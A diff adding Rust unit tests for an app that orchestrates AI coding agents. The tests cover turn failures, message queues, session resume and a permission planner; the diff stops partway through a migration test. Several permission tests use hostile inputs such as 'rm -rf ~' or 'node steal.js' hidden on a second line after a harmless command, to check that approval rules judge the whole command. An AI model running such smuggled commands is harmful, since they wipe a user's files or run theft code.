@@ -454,3 +454,914 @@ mod claude {
         assert_eq!(api::status(&claude.id), api::ThreadStatus { alive: false, working: false });
     }
 }
+
+fn user_item(id: &str) -> crate::canal::timeline::Item {
+    crate::canal::timeline::Item::new(ItemKind::User, id.to_string(), None)
+}
+
+fn pending_request(conn: &rusqlite::Connection, id: &str, thread_id: &str) {
+    let row = RequestRow {
+        id: id.into(), thread_id: thread_id.into(), rpc_id: "7".into(), kind: "command".into(), item_id: None,
+        title: "ls".into(), detail: String::new(), options: json!([]), state: "pending".into(), created_at: 1,
+    };
+    store::insert_request(conn, &row).unwrap();
+}
+
+#[test]
+fn processo_que_cai_no_turno_vira_erro_e_o_fechado_de_proposito_vira_interrompido() {
+    // Fechado por nós (fechar a conversa, trocar o acesso): é interrupção, sem texto e sem aviso de erro.
+    let (parado, aviso) = super::turn::dropped(true, None, "Codex");
+    assert!(parado.interrupted && parado.error.is_none() && aviso.is_none());
+    // Caiu sozinho: não é a pessoa que parou, é erro com o motivo.
+    let (caiu, aviso) = super::turn::dropped(false, None, "Codex");
+    assert!(!caiu.interrupted);
+    assert_eq!(caiu.error.as_deref(), Some("O processo do Codex fechou no meio do turno"));
+    assert_eq!(aviso, caiu.error);
+    // Com o rabo do stderr, o motivo é ele.
+    let (com_stderr, _) = super::turn::dropped(false, Some("  panic: sem memória  "), "Claude");
+    assert_eq!(com_stderr.error.as_deref(), Some("panic: sem memória"));
+}
+
+#[test]
+fn o_fim_do_turno_que_caiu_grava_o_erro_no_item_e_expira_os_pedidos() {
+    let conn = crate::database::test_db();
+    thread(&conn, "t1");
+    store::upsert_run(&conn, "t1", "r1", "inProgress", Some(1), None, None).unwrap();
+    pending_request(&conn, "q1", "t1");
+    let (result, _) = super::turn::dropped(false, None, "Codex");
+    assert_eq!(super::turn::record_end(&conn, "t1", "r1", &result, 50), ["q1"]);
+    assert_eq!(store::run_status(&conn, "t1", "r1").unwrap().as_deref(), Some("failed"), "o turno não fica inProgress");
+    let end = store::items(&conn, "t1").unwrap().into_iter().find(|i| i.kind == ItemKind::TurnEnd).expect("o turnEnd é gravado");
+    assert_eq!((end.id.as_str(), end.interrupted, end.text.as_deref()), ("end:r1", Some(false), Some("O processo do Codex fechou no meio do turno")));
+    assert!(store::pending_requests(&conn, "t1").unwrap().is_empty());
+}
+
+#[test]
+fn no_arranque_o_turno_e_os_pedidos_orfaos_expiram_sem_apagar_nada() {
+    let conn = crate::database::test_db();
+    thread(&conn, "t1");
+    thread(&conn, "t2");
+    // t1: um turno concluído e um que o app deixou aberto (a queda do app mata o agente).
+    store::upsert_run(&conn, "t1", "r1", "completed", Some(1), Some(2), Some(1)).unwrap();
+    store::upsert_run(&conn, "t1", "r2", "inProgress", Some(3), None, None).unwrap();
+    store::upsert_item(&conn, "t1", Some("r2"), &user_item("u2")).unwrap();
+    pending_request(&conn, "q1", "t1");
+    // t2: o turno aberto NÃO é o último da timeline (um mais novo já escreveu): não ganha turnEnd.
+    store::upsert_run(&conn, "t2", "r3", "inProgress", Some(3), None, None).unwrap();
+    store::upsert_item(&conn, "t2", Some("r3"), &user_item("u3")).unwrap();
+    store::upsert_item(&conn, "t2", Some("r4"), &user_item("u4")).unwrap();
+
+    let sweep = store::sweep_orphans(&conn, 100).unwrap();
+    assert_eq!((sweep.runs, sweep.requests), (2, 1));
+    assert_eq!(store::run_status(&conn, "t1", "r1").unwrap().as_deref(), Some("completed"), "o que acabou fica como estava");
+    assert_eq!(store::run_status(&conn, "t1", "r2").unwrap().as_deref(), Some("interrupted"));
+    assert!(store::pending_requests(&conn, "t1").unwrap().is_empty());
+    let expired: String = conn.query_row("SELECT state FROM chat_request WHERE id = 'q1'", [], |r| r.get(0)).unwrap();
+    assert_eq!(expired, "expired", "o pedido continua na tabela, só expirado");
+    // O turno que ficou aberto na ponta ganha o turnEnd durável; o do meio, não.
+    let end = store::items(&conn, "t1").unwrap().into_iter().find(|i| i.kind == ItemKind::TurnEnd).expect("turnEnd do app que fechou");
+    assert_eq!((end.id.as_str(), end.interrupted), ("end:r2", Some(false)));
+    assert!(end.text.as_deref().is_some_and(|t| t.contains("app foi fechado")), "{:?}", end.text);
+    assert!(store::items(&conn, "t2").unwrap().iter().all(|i| i.kind != ItemKind::TurnEnd));
+    assert_eq!(store::items(&conn, "t2").unwrap().len(), 2, "nenhuma linha apagada");
+    // Rodar de novo não acha mais nada.
+    let again = store::sweep_orphans(&conn, 200).unwrap();
+    assert_eq!((again.runs, again.requests), (0, 0));
+}
+
+// ── Etapa 2: o envio a uma conversa (trava, modo, classe do erro) ────────
+
+mod envio {
+    use std::sync::atomic::{AtomicUsize, Ordering};
+    use std::sync::Arc;
+
+    use super::super::api::{admits, codex_error, send_gate, steer_falls_back_to_start};
+    use super::super::codex::{failure_of, RequestFailure};
+    use super::super::envio::{SendError, SendMode};
+
+    #[test]
+    fn o_modo_fila_so_entra_com_a_conversa_livre_e_o_steer_sempre() {
+        assert!(admits(SendMode::QueueAfterActive, false));
+        assert!(!admits(SendMode::QueueAfterActive, true));
+        assert!(admits(SendMode::SteerActive, true) && admits(SendMode::SteerActive, false));
+    }
+
+    #[test]
+    fn o_steer_recusado_so_vira_turn_start_se_o_turno_ja_nao_e_o_mesmo() {
+        assert!(steer_falls_back_to_start("t1", None), "o turno acabou entre a checagem e o pedido");
+        assert!(steer_falls_back_to_start("t1", Some("t2")), "outro turno já começou");
+        assert!(!steer_falls_back_to_start("t1", Some("t1")), "o turno segue: a recusa é de outro motivo");
+    }
+
+    #[test]
+    fn so_o_pedido_que_saiu_e_perdeu_a_resposta_e_desconhecido() {
+        assert_eq!(codex_error(RequestFailure::NotSent("fechou".into())), SendError::NotSent("fechou".into()));
+        assert_eq!(codex_error(RequestFailure::Rejected("turno velho".into())), SendError::NotSent("turno velho".into()));
+        assert!(matches!(codex_error(RequestFailure::Lost("sem resposta".into())), SendError::Unknown(m) if m.starts_with("sem resposta") && m.contains("confira a conversa antes de reenviar")));
+    }
+
+    #[test]
+    fn a_mensagem_de_processo_fechado_e_perda_e_o_erro_do_servidor_e_recusa() {
+        assert_eq!(failure_of(Err("O processo do Codex fechou".into())), Err(RequestFailure::Lost("O processo do Codex fechou".into())));
+        assert_eq!(failure_of(Err("expectedTurnId não confere".into())), Err(RequestFailure::Rejected("expectedTurnId não confere".into())));
+        assert!(failure_of(Ok(serde_json::json!({ "ok": true }))).is_ok());
+    }
+
+    #[test]
+    fn o_erro_de_envio_vira_texto_para_quem_so_conhece_string() {
+        assert_eq!(String::from(SendError::NotSent("x".into())), "x");
+        assert!(String::from(SendError::Busy).contains("turno"));
+    }
+
+    #[test]
+    fn a_trava_e_uma_por_conversa() {
+        assert!(Arc::ptr_eq(&send_gate("gate-a"), &send_gate("gate-a")));
+        assert!(!Arc::ptr_eq(&send_gate("gate-a"), &send_gate("gate-b")));
+    }
+
+    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+    async fn dois_envios_a_mesma_conversa_nunca_entram_juntos() {
+        let inside = Arc::new(AtomicUsize::new(0));
+        let highest = Arc::new(AtomicUsize::new(0));
+        let tasks: Vec<_> = (0..16)
+            .map(|_| {
+                let (inside, highest) = (inside.clone(), highest.clone());
+                tokio::spawn(async move {
+                    let gate = send_gate("gate-corrida");
+                    let _held = gate.lock().await;
+                    let now = inside.fetch_add(1, Ordering::SeqCst) + 1;
+                    highest.fetch_max(now, Ordering::SeqCst);
+                    // Cede a vez no meio do "envio": sem a trava, outro entraria aqui.
+                    tokio::task::yield_now().await;
+                    inside.fetch_sub(1, Ordering::SeqCst);
+                })
+            })
+            .collect();
+        for task in tasks {
+            task.await.unwrap();
+        }
+        assert_eq!(highest.load(Ordering::SeqCst), 1);
+    }
+}
+
+// ── Etapa 3 (A1): retomar a sessão sem esquecer em silêncio ─────────────
+
+mod retomada {
+    use std::cell::RefCell;
+    use std::sync::Arc;
+    use std::time::Duration;
+
+    use super::super::resume::{classify, lost_notice, open_resuming, start_gate, Opened, ResumeFailure, RETRY_PAUSES};
+
+    /// Roda `open_resuming` com as tentativas roteirizadas: o que cada `resume` devolve, em ordem, e o registro
+    /// de quantas vezes abriu sessão nova e de quais pausas pediu (sem relógio).
+    fn run(script: Vec<Result<&'static str, ResumeFailure>>) -> (Result<Opened<&'static str>, String>, usize, Vec<Duration>) {
+        let script = RefCell::new(script.into_iter());
+        let fresh_calls = RefCell::new(0usize);
+        let pauses = RefCell::new(Vec::new());
+        let out = tokio::runtime::Builder::new_current_thread().build().unwrap().block_on(open_resuming(
+            || async { script.borrow_mut().next().expect("tentativa a mais") },
+            || async { *fresh_calls.borrow_mut() += 1; Ok("nova") },
+            |wait| { pauses.borrow_mut().push(wait); async {} },
+        ));
+        (out, *fresh_calls.borrow(), pauses.into_inner())
+    }
+
+    #[test]
+    fn a_retomada_que_funciona_nao_abre_sessao_nova_nem_avisa() {
+        let (out, fresh, pauses) = run(vec![Ok("retomada")]);
+        assert_eq!(out, Ok(Opened { session: "retomada", lost: None }));
+        assert_eq!((fresh, pauses.len()), (0, 0));
+    }
+
+    #[test]
+    fn a_sessao_que_nao_existe_mais_abre_outra_e_diz_o_motivo() {
+        let (out, fresh, pauses) = run(vec![Err(ResumeFailure::Gone("No conversation found".into()))]);
+        assert_eq!(out, Ok(Opened { session: "nova", lost: Some("No conversation found".into()) }));
+        assert_eq!((fresh, pauses.len()), (1, 0), "sem retentativa: ela não existe");
+    }
+
+    #[test]
+    fn o_erro_transitorio_tenta_de_novo_com_pausa_curta_e_nao_esquece_se_voltar() {
+        let (out, fresh, pauses) = run(vec![Err(ResumeFailure::Transient("fechou".into())), Ok("retomada")]);
+        assert_eq!(out, Ok(Opened { session: "retomada", lost: None }));
+        assert_eq!((fresh, pauses), (0, vec![RETRY_PAUSES[0]]));
+    }
+
+    #[test]
+    fn o_erro_transitorio_que_persiste_abre_outra_mas_avisa() {
+        let (out, fresh, pauses) = run(vec![Err(ResumeFailure::Transient("a".into())), Err(ResumeFailure::Transient("b".into())), Err(ResumeFailure::Transient("c".into()))]);
+        assert_eq!(out, Ok(Opened { session: "nova", lost: Some("c".into()) }));
+        assert_eq!((fresh, pauses), (1, RETRY_PAUSES.to_vec()), "duas retentativas e depois a nova, com o último motivo");
+    }
+
+    #[test]
+    fn o_prazo_nao_abre_sessao_nova_e_o_erro_de_abrir_o_processo_tambem_nao() {
+        let (out, fresh, _) = run(vec![Err(ResumeFailure::Timeout("O Claude não respondeu a initialize".into()))]);
+        assert!(out.unwrap_err().contains("Ela foi mantida"));
+        assert_eq!(fresh, 0, "a sessão pode existir: o id dela não é trocado");
+        let (out, fresh, _) = run(vec![Err(ResumeFailure::Fatal("Não achei o Claude".into()))]);
+        assert_eq!((out, fresh), (Err("Não achei o Claude".to_string()), 0));
+    }
+
+    #[test]
+    fn os_textos_dos_motores_viram_a_classe_certa() {
+        assert!(matches!(classify("Não achei o Claude Code (claude) no PATH"), ResumeFailure::Fatal(_)));
+        assert!(matches!(classify("Não consegui abrir o Codex: boom"), ResumeFailure::Fatal(_)));
+        assert!(matches!(classify("O Codex não respondeu a thread/resume"), ResumeFailure::Timeout(_)));
+        assert!(matches!(classify("O Claude não respondeu a initialize"), ResumeFailure::Timeout(_)));
+        assert!(matches!(classify("No conversation found with session ID: abc"), ResumeFailure::Gone(_)));
+        assert!(matches!(classify("thread not found: thr_9"), ResumeFailure::Gone(_)));
+        assert!(matches!(classify("O processo do Claude fechou"), ResumeFailure::Transient(_)));
+        assert!(matches!(classify("erro do OpenCode"), ResumeFailure::Transient(_)));
+    }
+
+    #[test]
+    fn o_aviso_da_timeline_diz_que_o_agente_recomecou_sem_historico() {
+        assert!(lost_notice("").contains("recomeçou sem o histórico"));
+        assert!(lost_notice("thread not found").ends_with("Motivo: thread not found"));
+    }
+
+    #[test]
+    fn a_trava_de_abertura_e_por_conversa_e_por_motor() {
+        assert!(Arc::ptr_eq(&start_gate("claude", "a"), &start_gate("claude", "a")));
+        assert!(!Arc::ptr_eq(&start_gate("claude", "a"), &start_gate("claude", "b")), "um agente lento não trava as outras conversas");
+        assert!(!Arc::ptr_eq(&start_gate("claude", "a"), &start_gate("codex", "a")));
+    }
+}
+
+// ── Etapa 3 (A1): opções do OpenCode que não se engolem, e o item de aviso ──
+
+mod opcoes {
+    use serde_json::json;
+
+    use super::super::opencode::{plan_option, OptionPlan};
+    use super::super::turn::notice_item;
+    use crate::canal::timeline::ItemKind;
+
+    fn config() -> serde_json::Value {
+        json!({ "configOptions": [
+            { "id": "effort", "currentValue": "default", "options": [{ "value": "low" }, { "value": "default" }] },
+            { "id": "mode", "currentValue": "build", "options": [{ "value": "build" }, { "value": "plan" }] },
+        ] })
+    }
+
+    #[test]
+    fn a_opcao_igual_nao_se_pede_a_ausente_se_marca_e_a_desconhecida_se_tenta() {
+        assert_eq!(plan_option(&config(), "mode", "build"), OptionPlan::Same);
+        assert_eq!(plan_option(&config(), "mode", "plan"), OptionPlan::Set);
+        assert_eq!(plan_option(&config(), "effort", "ultra"), OptionPlan::Unavailable, "o modelo não tem esse esforço: aviso, nunca silêncio");
+        assert_eq!(plan_option(&json!({}), "mode", "build"), OptionPlan::Set, "o OpenCode que não lista a opção: tenta mesmo assim");
+    }
+
+    #[test]
+    fn o_aviso_e_um_item_proprio_com_o_codigo_no_label_e_id_unico() {
+        let a = notice_item("resumeLost", "A sessão anterior não pôde ser retomada", 5);
+        let b = notice_item("resumeLost", "A sessão anterior não pôde ser retomada", 5);
+        assert_eq!((a.kind, a.label.as_deref(), a.at), (ItemKind::Notice, Some("resumeLost"), Some(5)));
+        assert_ne!(a.id, b.id, "dois avisos iguais não colapsam");
+        assert_eq!(serde_json::to_value(&a).unwrap()["kind"], "notice");
+    }
+}
+
+// ── Etapa 3 (A2): a fila que não some mensagem ──────────────────────────
+
+mod fila {
+    use std::sync::{Arc, Barrier};
+
+    use super::super::turn::{dropped_items, Admitted, Lane};
+    use crate::canal::timeline::ItemKind;
+
+    #[test]
+    fn a_conversa_livre_comeca_o_turno_e_a_ocupada_enfileira_em_ordem() {
+        let lane = Lane::default();
+        let Admitted::Start(first) = lane.admit("um") else { panic!("livre: começa") };
+        assert_eq!(lane.turn().as_deref(), Some(first.as_str()), "o turno já fica reservado");
+        assert_eq!((lane.admit("dois"), lane.admit("tres")), (Admitted::Queued, Admitted::Queued));
+        assert_eq!(lane.queued(), 2);
+        assert_eq!(lane.take_turn().as_deref(), Some(first.as_str()));
+        let (turn, text) = lane.advance().unwrap();
+        assert_eq!(text, "dois", "FIFO");
+        assert_eq!(lane.turn().as_deref(), Some(turn.as_str()));
+        assert_eq!(lane.drain(), ["tres"]);
+        lane.take_turn();
+        assert!(lane.advance().is_none());
+        assert!(matches!(lane.admit("quatro"), Admitted::Start(_)), "fila vazia e sem turno: a próxima começa");
+    }
+
+    /// A corrida que encalhava a mensagem: ela chega no instante em que o turno acaba. Com a decisão sob uma
+    /// trava só, ou ela é vista pelo `advance` (estava na fila) ou acha o turno livre e começa. Nunca fica na
+    /// fila com o turno livre.
+    #[test]
+    fn a_mensagem_que_chega_quando_o_turno_acaba_nunca_fica_encalhada() {
+        for _ in 0..500 {
+            let lane = Arc::new(Lane::default());
+            assert!(matches!(lane.admit("em andamento"), Admitted::Start(_)));
+            let barrier = Arc::new(Barrier::new(2));
+            let ender = {
+                let (lane, barrier) = (lane.clone(), barrier.clone());
+                std::thread::spawn(move || {
+                    barrier.wait();
+                    lane.take_turn();
+                    lane.advance()
+                })
+            };
+            barrier.wait();
+            let admitted = lane.admit("no instante");
+            let advanced = ender.join().unwrap();
+            let started = matches!(admitted, Admitted::Start(_));
+            let popped = advanced.is_some();
+            assert!(started ^ popped, "exatamente um dos dois a leva: {admitted:?} / {advanced:?}");
+            assert!(lane.queued() == 0, "nada encalhado na fila");
+        }
+    }
+
+    #[test]
+    fn cada_mensagem_descartada_vira_um_aviso_nao_enviada_com_o_texto_dela() {
+        let items = dropped_items(vec!["rode os testes".into(), "rode os testes".into(), "e o lint?".into()], 9);
+        assert_eq!(items.len(), 3, "duas iguais são duas mensagens: nenhuma some");
+        assert!(items.iter().all(|i| i.kind == ItemKind::Notice && i.label.as_deref() == Some("queueDropped") && i.at == Some(9)));
+        assert_eq!(items.iter().map(|i| i.text.as_deref().unwrap()).collect::<Vec<_>>(), ["rode os testes", "rode os testes", "e o lint?"]);
+        let ids: std::collections::HashSet<_> = items.iter().map(|i| i.id.clone()).collect();
+        assert_eq!(ids.len(), 3);
+        assert!(dropped_items(Vec::new(), 9).is_empty());
+    }
+}
+
+// ── Etapa 3 (A4): o aviso no stderr não é o erro ────────────────────────
+
+mod stderr {
+    use super::super::turn::{dropped, stderr_reason};
+
+    fn lines(v: &[&str]) -> Vec<String> {
+        v.iter().map(|l| l.to_string()).collect()
+    }
+
+    #[test]
+    fn o_aviso_depois_do_erro_nao_vira_o_motivo_da_queda() {
+        let tail = lines(&["Error: sessão corrompida", "", "warning: update available", "  INFO  shutting down"]);
+        assert_eq!(stderr_reason(tail.iter()).as_deref(), Some("Error: sessão corrompida"));
+        // Antes (a última linha qualquer) o motivo mostrado era o aviso inofensivo.
+        let before = tail.iter().rev().find(|l| !l.trim().is_empty()).cloned();
+        assert_eq!(before.as_deref(), Some("  INFO  shutting down"));
+    }
+
+    #[test]
+    fn so_aviso_no_stderr_cai_na_frase_generica() {
+        let tail = lines(&["[WARN] node deprecation", "debug: closing"]);
+        assert_eq!(stderr_reason(tail.iter()), None);
+        let (result, message) = dropped(false, None, "Claude");
+        assert_eq!(result.error.as_deref(), Some("O processo do Claude fechou no meio do turno"));
+        assert_eq!(message, result.error);
+    }
+}
+
+// ── Etapa 3 (B): a permissão decidida no backend ────────────────────────
+
+mod permissao {
+    use rusqlite::Connection;
+    use serde_json::{json, Value};
+
+    use super::super::codex_map::{ask_of, Ask};
+    use super::super::permission::{draft_claude, draft_codex, draft_opencode, plan, plan_stored, Draft};
+    use super::super::store::{self, RequestRow, Tuning};
+    use crate::chat_team::model::{Policy, Verdict};
+    use crate::chat_team::permission::{Kind, Subject};
+    use crate::chat_team::store as team_store;
+    use crate::chat_team::store::NewMember;
+
+    fn db() -> Connection {
+        crate::database::test_db()
+    }
+
+    /// Uma conversa `t1` no time `team1` (orquestrador `tab-lead`), com a política dada.
+    fn member_with(conn: &Connection, policy: Policy) {
+        store::insert_thread(conn, "t1", "codex", "/p", "T", &Tuning { model: None, effort: None, access: "ask".into() }, None, 1).unwrap();
+        let row = team_store::TeamRow { id: "team1".into(), orchestrator: "tab-lead".into(), agent_id: "claude-code".into(), label: "L".into(), cwd: "/p".into(), title: "T".into(), created_at: 1, updated_at: 1, auto_decide: true, allow_tools: false };
+        team_store::insert_team(conn, &row).unwrap();
+        let new = NewMember { member: "thread:t1".into(), agent_id: "codex".into(), label: "Codex".into(), role: "backend".into(), origin: "existing".into(), ..Default::default() };
+        team_store::insert_member(conn, "team1", &new, policy, 1).unwrap();
+    }
+
+    fn cmd(detail: &str) -> Subject {
+        Subject::new(Kind::Command, detail.into(), vec![], Some("/p".into()), "codex")
+    }
+
+    fn request(id: &str, kind: &str) -> RequestRow {
+        RequestRow { id: id.into(), thread_id: "t1".into(), rpc_id: "7".into(), kind: kind.into(), item_id: None, title: "ls".into(), detail: String::new(), options: json!([]), state: "pending".into(), created_at: 1 }
+    }
+
+    // ── o pedido inteiro, não o título truncado ──
+
+    fn codex_ask(command: &str) -> (Value, Ask) {
+        let params = json!({ "itemId": "i1", "command": command, "reason": "r" });
+        let ask = ask_of("item/commandExecution/requestApproval", &params).unwrap();
+        (params, ask)
+    }
+
+    #[test]
+    fn o_codex_decide_sobre_o_comando_inteiro_e_nao_sobre_a_primeira_linha() {
+        let (params, ask) = codex_ask("ls -la\nrm -rf ~");
+        assert_eq!(ask.title, "ls -la", "o título guarda só a primeira linha");
+        let draft = draft_codex("item/commandExecution/requestApproval", &params, &ask).unwrap();
+        assert_eq!((draft.kind, draft.detail.as_str()), (Kind::Command, "ls -la\nrm -rf ~"));
+    }
+
+    #[test]
+    fn o_claude_usa_o_comando_do_input_a_edicao_o_arquivo_a_rede_o_endereco_e_a_pergunta_fica_com_a_pessoa() {
+        let bash = json!({ "subtype": "can_use_tool", "tool_name": "Bash", "tool_use_id": "t", "input": { "command": "ls\nnode steal.js" } });
+        let draft = draft_claude(&bash, &crate::conversa::claude_map::ask_of(&bash).unwrap()).unwrap();
+        assert_eq!(draft.detail, "ls\nnode steal.js");
+        let edit = json!({ "subtype": "can_use_tool", "tool_name": "Edit", "tool_use_id": "t", "input": { "file_path": "src/a.ts" } });
+        let draft = draft_claude(&edit, &crate::conversa::claude_map::ask_of(&edit).unwrap()).unwrap();
+        assert_eq!((draft.kind, draft.files), (Kind::Edit, vec!["src/a.ts".to_string()]));
+        let web = json!({ "subtype": "can_use_tool", "tool_name": "WebFetch", "tool_use_id": "t", "input": { "url": "https://docs.rs/x" } });
+        let draft = draft_claude(&web, &crate::conversa::claude_map::ask_of(&web).unwrap()).unwrap();
+        assert_eq!(draft.kind, Kind::Network);
+        let other = json!({ "subtype": "can_use_tool", "tool_name": "mcp__x__run", "tool_use_id": "t", "input": {} });
+        let draft = draft_claude(&other, &crate::conversa::claude_map::ask_of(&other).unwrap()).unwrap();
+        assert!(draft.kind == Kind::Command && draft.detail.starts_with("mcp__x__run"), "ferramenta de fora do shell: o nome fica no começo");
+        assert_eq!(draft.foreign.as_deref(), Some("mcp__x__run"), "e vem marcada: regra de shell nenhuma a casa");
+        let task = json!({ "subtype": "can_use_tool", "tool_name": "Task", "tool_use_id": "t", "input": { "description": "x" } });
+        assert_eq!(draft_claude(&task, &crate::conversa::claude_map::ask_of(&task).unwrap()).unwrap().foreign.as_deref(), Some("Task"));
+        let plan_exit = json!({ "subtype": "can_use_tool", "tool_name": "ExitPlanMode", "tool_use_id": "t", "input": { "plan": "p" } });
+        assert_eq!(draft_claude(&plan_exit, &crate::conversa::claude_map::ask_of(&plan_exit).unwrap()), None);
+        let question = json!({ "subtype": "can_use_tool", "tool_name": "AskUserQuestion", "tool_use_id": "t", "input": { "questions": [] } });
+        assert_eq!(draft_claude(&question, &crate::conversa::claude_map::ask_of(&question).unwrap()), None);
+    }
+
+    #[test]
+    fn o_opencode_usa_o_comando_do_raw_input() {
+        let params = json!({
+            "options": [{ "optionId": "o1", "kind": "allow_once", "name": "Allow" }],
+            "toolCall": { "toolCallId": "c", "kind": "execute", "title": "bash", "rawInput": { "command": "ls\nrm -rf ~" } },
+        });
+        let ask = crate::conversa::opencode_map::ask_of(&params).unwrap();
+        let draft = draft_opencode(&params, &ask).unwrap();
+        assert_eq!(draft, Draft { kind: Kind::Command, detail: "ls\nrm -rf ~".into(), files: vec![], foreign: None });
+    }
+
+    #[test]
+    fn so_o_execute_do_opencode_e_comando_de_shell() {
+        let params = json!({
+            "options": [{ "optionId": "o1", "kind": "allow_once", "name": "Allow" }],
+            "toolCall": { "toolCallId": "c", "kind": "fetch", "title": "webfetch https://x" },
+        });
+        let ask = crate::conversa::opencode_map::ask_of(&params).unwrap();
+        let draft = draft_opencode(&params, &ask).unwrap();
+        assert_eq!(draft.foreign.as_deref(), Some("opencode:fetch"));
+    }
+
+    #[test]
+    fn a_flag_do_time_decide_se_o_acesso_total_libera_a_ferramenta_de_fora_do_shell() {
+        let conn = db();
+        member_with(&conn, Policy::Full);
+        let mut tool = cmd("mcp__x__run: algo");
+        tool.foreign = Some("mcp__x__run".into());
+        let d = plan(&conn, "t1", &tool);
+        assert_eq!(d.verdict, Verdict::Ask, "desligada por padrão");
+        assert!(d.why.contains("mcp__x__run"));
+        team_store::set_allow_tools(&conn, "team1", true).unwrap();
+        assert_eq!(plan(&conn, "t1", &tool).verdict, Verdict::Allow);
+        // A flag do time não libera risco alto de shell.
+        assert_eq!(plan(&conn, "t1", &cmd("git push")).verdict, Verdict::Ask);
+    }
+
+    // ── quem decide ──
+
+    #[test]
+    fn o_integrante_com_acesso_total_e_liberado_pela_politica_e_o_so_leitura_e_negado() {
+        let conn = db();
+        member_with(&conn, Policy::Full);
+        let d = plan(&conn, "t1", &cmd("bun add zod"));
+        assert_eq!((d.verdict, d.by.as_str()), (Verdict::Allow, "policy"));
+        assert_eq!(plan(&conn, "t1", &cmd("git push origin main")).verdict, Verdict::Ask, "risco alto vai à pessoa");
+        team_store::patch_member(&conn, "thread:t1", &team_store::MemberPatch { policy: Some(Policy::Read), ..Default::default() }, 2).unwrap();
+        assert_eq!(plan(&conn, "t1", &cmd("bun add zod")).verdict, Verdict::Deny);
+    }
+
+    #[test]
+    fn a_regra_da_pessoa_libera_o_que_a_politica_pergunta() {
+        let conn = db();
+        member_with(&conn, Policy::Ask);
+        assert_eq!(plan(&conn, "t1", &cmd("cargo build")).verdict, Verdict::Ask);
+        let rule = team_store::add_rule(&conn, Kind::Command, "cargo build *", None, 5).unwrap();
+        let d = plan(&conn, "t1", &cmd("cargo build --release"));
+        assert_eq!((d.verdict, d.by), (Verdict::Allow, format!("rule:{}", rule.id)));
+        assert_eq!(plan(&conn, "t1", &cmd("cargo build\nrm -rf ~")).verdict, Verdict::Ask, "o comando inteiro, não a primeira linha");
+    }
+
+    #[test]
+    fn o_interruptor_do_time_manda_tudo_para_a_pessoa() {
+        let conn = db();
+        member_with(&conn, Policy::Full);
+        team_store::add_rule(&conn, Kind::Command, "*", None, 5).unwrap();
+        assert_eq!(plan(&conn, "t1", &cmd("ls")).verdict, Verdict::Allow);
+        team_store::set_auto_decide(&conn, "team1", false).unwrap();
+        assert_eq!(plan(&conn, "t1", &cmd("ls")).verdict, Verdict::Ask);
+    }
+
+    #[test]
+    fn fora_de_time_so_as_regras_valem_e_sem_regra_pergunta() {
+        let conn = db();
+        store::insert_thread(&conn, "t1", "codex", "/p", "T", &Tuning { model: None, effort: None, access: "ask".into() }, None, 1).unwrap();
+        assert_eq!(plan(&conn, "t1", &cmd("ls")).verdict, Verdict::Ask);
+        team_store::add_rule(&conn, Kind::Command, "ls *", Some("codex"), 5).unwrap();
+        assert_eq!(plan(&conn, "t1", &cmd("ls -la")).verdict, Verdict::Allow);
+        let other = Subject::new(Kind::Command, "ls -la".into(), vec![], None, "claude-code");
+        assert_eq!(plan(&conn, "t1", &other).verdict, Verdict::Ask, "a regra é do Codex");
+    }
+
+    #[test]
+    fn o_orquestrador_nao_tem_politica_so_regras() {
+        let conn = db();
+        store::insert_thread(&conn, "lead", "claude-code", "/p", "T", &Tuning { model: None, effort: None, access: "ask".into() }, None, 1).unwrap();
+        let row = team_store::TeamRow { id: "team1".into(), orchestrator: "thread:lead".into(), agent_id: "claude-code".into(), label: "L".into(), cwd: "/p".into(), title: "T".into(), created_at: 1, updated_at: 1, auto_decide: true, allow_tools: false };
+        team_store::insert_team(&conn, &row).unwrap();
+        assert_eq!(plan(&conn, "lead", &cmd("bun add zod")).verdict, Verdict::Ask, "sem política de integrante nem regra, a pessoa decide");
+    }
+
+    // ── a varredura ──
+
+    #[test]
+    fn a_varredura_decide_pelo_pedido_guardado_e_nunca_o_sem_subject_nem_a_pergunta() {
+        let conn = db();
+        member_with(&conn, Policy::Full);
+        // Um pedido guardado com o subject inteiro: a política libera.
+        store::insert_request(&conn, &request("q1", "command")).unwrap();
+        store::set_subject(&conn, "q1", &serde_json::to_string(&cmd("bun add zod")).unwrap()).unwrap();
+        // O mesmo pedido, de antes desta versão (sem subject): nunca é decidido sozinho.
+        store::insert_request(&conn, &request("q2", "command")).unwrap();
+        // Uma pergunta é sempre da pessoa, mesmo com subject.
+        store::insert_request(&conn, &request("q3", "question")).unwrap();
+        store::set_subject(&conn, "q3", &serde_json::to_string(&cmd("ls")).unwrap()).unwrap();
+        // De risco alto.
+        store::insert_request(&conn, &request("q4", "command")).unwrap();
+        store::set_subject(&conn, "q4", &serde_json::to_string(&cmd("git push")).unwrap()).unwrap();
+        let rows = store::pending_all(&conn).unwrap();
+        let decided: Vec<(&str, Verdict)> = rows.iter().filter_map(|r| plan_stored(&conn, r).map(|d| (r.id.as_str(), d.verdict))).collect();
+        assert_eq!(decided, [("q1", Verdict::Allow)]);
+    }
+
+    #[test]
+    fn so_as_conversas_ativas_entram_na_varredura() {
+        let conn = db();
+        member_with(&conn, Policy::Full);
+        store::insert_request(&conn, &request("q1", "command")).unwrap();
+        assert_eq!(store::pending_all(&conn).unwrap().len(), 1);
+        store::set_state(&conn, "t1", "settled", 5).unwrap();
+        assert!(store::pending_all(&conn).unwrap().is_empty());
+    }
+
+    #[test]
+    fn a_resposta_grava_quem_decidiu_e_a_da_pessoa_diz_person() {
+        let conn = db();
+        member_with(&conn, Policy::Ask);
+        store::insert_request(&conn, &request("q1", "command")).unwrap();
+        store::insert_request(&conn, &request("q2", "command")).unwrap();
+        assert!(store::answer_request_by(&conn, "q1", "allow", 5, "rule:r9", Some("Liberado pela regra")).unwrap());
+        assert!(store::answer_request(&conn, "q2", "deny", 6).unwrap());
+        assert!(!store::answer_request_by(&conn, "q1", "deny", 7, "policy", None).unwrap(), "responder duas vezes não muda quem decidiu");
+        let decisions = store::recent_decisions(&conn, "t1", 10).unwrap();
+        let seen: Vec<(&str, &str, Option<&str>, Option<&str>)> = decisions.iter().map(|d| (d.request_id.as_str(), d.answer.as_str(), d.by.as_deref(), d.why.as_deref())).collect();
+        assert_eq!(seen, [("q2", "deny", Some("person"), None), ("q1", "allow", Some("rule:r9"), Some("Liberado pela regra"))]);
+    }
+
+    #[test]
+    fn a_migracao_das_colunas_da_decisao_roda_duas_vezes_e_guarda_o_que_havia() {
+        let conn = db();
+        store::migrate(&conn).unwrap();
+        store::migrate(&conn).unwrap();
+        member_with(&conn, Policy::Ask);
